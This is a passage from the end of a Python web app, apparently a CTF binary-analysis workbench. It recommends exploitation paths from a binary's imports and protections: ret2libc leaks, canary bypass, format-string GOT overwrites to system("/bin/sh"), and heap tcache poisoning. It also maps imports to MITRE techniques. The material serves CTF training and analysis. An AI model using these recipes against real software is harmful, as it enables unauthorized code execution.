                    'skeleton': _skeleton('syscall_rop', {'filename': filename, 'offset': off,
                                                          'binsh': binsh['vaddr'] if binsh else '0x0'}),
                })
            paths.append({
                'name': 'ret2libc (leak + return)', 'confidence': 'medium',
                'why': 'dynamically linked, NX on, no canary — classic 2-stage leak',
                'steps': ['Stage 1: leak a libc address (puts(puts@got)), return to main/vuln',
                          'Compute libc base from the leak',
                          'Stage 2: overflow again → system("/bin/sh") or a one_gadget'],
                'skeleton': _skeleton('ret2libc', {'filename': filename, 'offset': off}),
            })
        if canary:
            paths.append({
                'name': 'Defeat the stack canary first', 'confidence': 'info',
                'why': 'canary present — a raw overwrite of RIP will trip __stack_chk_fail',
                'steps': ['Leak it: format string, an OOB read/print, or brute-force byte-by-byte on a forking server',
                          'Keep the leaked canary word in place in your payload, then overflow past it'],
                'skeleton': '',
            })

    if (imports & VULN_FMT) and 'printf' in imports:
        paths.append({
            'name': 'Format string', 'confidence': 'medium',
            'why': 'printf-family import present — exploitable if the format arg is user-controlled',
            'steps': ['Find your arg offset: send `%p ` * 20 and count to your bytes',
                      'Leak: canary (`%N$p`), PIE/ELF base, libc (a __libc_start_main+ret on the stack)',
                      'Write: `fmtstr_payload(off, {target: value})` — '
                      + ('printf@got → system@plt (partial RELRO)' if not relro
                         else '__free_hook / return address (full RELRO)')],
            'skeleton': _skeleton('fmt', {'filename': filename}),
        })

    if {'malloc', 'free'} <= imports or {'malloc', 'calloc'} & imports:
        paths.append({
            'name': 'Heap exploitation', 'confidence': 'medium' if {'malloc', 'free'} <= imports else 'low',
            'why': f'{"malloc+free" if {"malloc","free"} <= imports else "allocator"} imported'
                   + (' — no free(), look for a UAF via a dangling menu pointer' if 'free' not in imports else ''),
            'steps': ['Identify the menu: alloc / free / edit / view primitives and the max size',
                      'tcache poisoning (glibc <2.32) or safe-linking bypass (>=2.32): free two chunks, '
                      'corrupt fd, malloc back to an arbitrary address',
                      'Targets: __free_hook→system, a saved return address, a GOT entry, or FSOP on stdout'],
            'skeleton': _skeleton('heap', {'filename': filename}),
        })

    if not paths:
        paths.append({
            'name': 'No obvious memory-corruption primitive', 'confidence': 'info',
            'why': 'none of the usual unsafe imports/patterns matched',
            'steps': ['Run the angr solver (Solvers tab) if this is a flag-checker / crackme',
                      'Look for logic bugs: off-by-one, signed/unsigned size checks, integer overflow before malloc',
                      'Diff strings/xrefs for a hidden menu option or command'],
            'skeleton': '',
        })

    conf_rank = {'high': 0, 'medium': 1, 'low': 2, 'info': 3}
    paths.sort(key=lambda p: conf_rank.get(p.get('confidence'), 4))

    return {
        'protections': {
            'NX': str(prot.get('NX (No-Execute)', '?')),
            'PIE': str(prot.get('PIE (ASLR)', '?')),
            'Canary': str(prot.get('Stack Canary', '?')),
            'RELRO': str(prot.get('RELRO', '?')),
        },
        'summary': {
            'arch': f'{loader.arch} {loader.bits}-bit',
            'static': static,
            'win_functions': win_functions,
            'binsh': binsh,
            'gadgets': gadgets,
        },
        'overflow_sites': overflow_sites,
        'vulnerable_functions': functions_exploit,
        'paths': paths,
    }


# ── Exploit Techniques ───────────────────────────────────────────────

@app.get('/api/exploit-techniques')
def api_exploit_techniques():
    techniques = []
    mitre_to_funcs = {}
    try:
        loader = _get_loader()
        for imp in loader.get_imports():
            fname = imp['name']
            if fname in MITRE_VULN_MAP:
                info = MITRE_VULN_MAP[fname]
                tid = info['tid']
                mitre_to_funcs.setdefault(tid, []).append(fname)
        has_nx = True
        try:
            secs = loader.get_sections()
            for s in secs:
                if '.text' in s.get('name', '') and 'X' not in s.get('flags', ''):
                    has_nx = False
                if 'WX' in s.get('flags', '') or (
                    'W' in s.get('flags', '') and 'X' in s.get('flags', '')
                ):
                    has_nx = False
        except Exception:
            pass
    except Exception:
        return {'techniques': EXPLOIT_TECHNIQUES, 'count': len(EXPLOIT_TECHNIQUES)}

    for t in EXPLOIT_TECHNIQUES:
        t_copy = dict(t)
        matched = mitre_to_funcs.get(t['mitre_id'], [])
        if matched:
            t_copy['matched_imports'] = matched
        if t['mitre_id'] == 'T1059.006' and not has_nx:
            t_copy['nx_status'] = 'disabled'
        techniques.append(t_copy)
    return {'techniques': techniques, 'count': len(techniques)}


# ── Frontend ──────────────────────────────────────────────────────────

@app.get('/favicon.ico')
def favicon():
    svg = (
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">'
        '<rect width="64" height="64" rx="8" fill="#0d1117"/>'
        '<text x="32" y="44" font-family="monospace" font-size="36" font-weight="bold" '
        'fill="#58a6ff" text-anchor="middle">T</text></svg>'
    )
    return Response(content=svg, media_type='image/svg+xml')


@app.get('/', response_class=HTMLResponse)
def index():
    # no-store so a redeployed build's JS isn't served from the browser cache
    return HTMLResponse(HTML_PAGE, headers={'Cache-Control': 'no-store'})


# ══════════════════════════════════════════════════════════════════════
# Entry point
# ══════════════════════════════════════════════════════════════════════

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description='Triage Web — CTF Binary Analysis Workbench'
    )
    parser.add_argument('binary', nargs='?', help='Path to binary to load')
    parser.add_argument('--host', default='0.0.0.0', help='Bind address (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=8888, help='Port (default: 8888)')
    args = parser.parse_args()

    if args.binary:
        try:
            loader = BinaryLoader(args.binary)
            if not HAS_CAPSTONE:
                log.error('capstone is required')
                sys.exit(1)
            disasm = Disassembler(loader.arch, loader.bits)
            rop = ROPEngine(loader)
            xrefs = XRefDB()
            _current.update({
                'loader': loader,
                'disasm': disasm,
                'rop': rop,
                'xrefs': xrefs,
                'path': args.binary,
                'filename': os.path.basename(args.binary),
            })
            log.info(f'Pre-loaded: {args.binary}')
        except Exception as e:
            log.error(f'Failed to load {args.binary}: {e}')
            sys.exit(1)

    import uvicorn

    log.info(f'Starting server at http://{args.host}:{args.port}')
    print(f'\n  \033[1;36mTriage Web — http://localhost:{args.port}\033[0m\n')
    # Plain host/port bind — portable across Linux and Windows. (An earlier
    # version passed an inherited socket via uvicorn's `fd=`, which fails on
    # Windows because uvicorn resolves it with socket.AF_UNIX.)
    config = uvicorn.Config(app, host=args.host, port=args.port, log_level='info')
    uvicorn.Server(config).run()


if __name__ == '__main__':
    main()
